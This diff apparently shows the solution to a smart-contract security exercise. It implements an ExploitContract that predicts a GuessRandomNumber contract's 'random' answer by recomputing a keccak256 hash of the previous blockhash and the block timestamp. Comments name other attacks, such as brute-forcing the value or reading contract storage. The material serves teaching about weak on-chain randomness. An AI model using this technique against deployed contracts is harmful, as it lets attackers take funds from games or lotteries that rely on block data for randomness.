@@ -35,10 +35,25 @@ contract GuessRandomNumber {
 //Write your exploit codes below
 contract ExploitContract {
     GuessRandomNumber public guessRandomNumber;
-    uint8 public answer;
 
-    function Exploit() public returns (uint8) {
-        
-        return answer;
+    function Exploit() public view returns (uint8 answer) {
+        // In the tests exploit contract is deployed in the same block as GuessRandomNumber contract
+        // so it is possible to simply replicate the logic of number generation.
+        //
+        // Alternatives would be:
+        // - pass the block number and hash as an argument to the function and calc the answer
+        // - iteration of all numbers from 0 to type(uint8).max and check the answer
+        // - read the answer from the contract storage
+
+        answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        );
     }
 }
